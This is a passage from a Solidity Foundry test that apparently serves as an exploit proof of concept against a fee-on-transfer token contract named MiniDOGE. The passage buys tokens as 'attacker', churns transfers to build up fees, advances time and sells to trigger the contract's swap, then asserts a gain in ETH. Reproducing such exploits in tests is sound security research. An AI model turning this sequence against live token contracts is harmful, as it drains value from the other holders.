        IERC20(weth).approve(address(router), type(uint256).max);

        // Buy tokens to create liquidity
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.5 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Generate fees by transferring between accounts
        address feeAcc1 = address(0x111);
        address feeAcc2 = address(0x222);
        deal(TARGET, feeAcc1, 2000000 * 10**6 * 10**9);

        // Make fee-generating transfers
        for (uint i = 0; i < 3; i++) {
            vm.prank(feeAcc1);
            MiniDOGE(TARGET).transfer(feeAcc2, 100000 * 10**6 * 10**9);

            vm.prank(feeAcc2);
            MiniDOGE(TARGET).transfer(feeAcc1, 100000 * 10**6 * 10**9);
        }

        // Wait for swap interval
        vm.warp(block.timestamp + 2 minutes);

        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Trigger swap by selling tokens
        uint256 sellAmount = MiniDOGE(TARGET).balanceOf(attacker) / 2;
        MiniDOGE(TARGET).approve(address(router), sellAmount);

        path[0] = TARGET;
        path[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check ETH balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "ETH balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
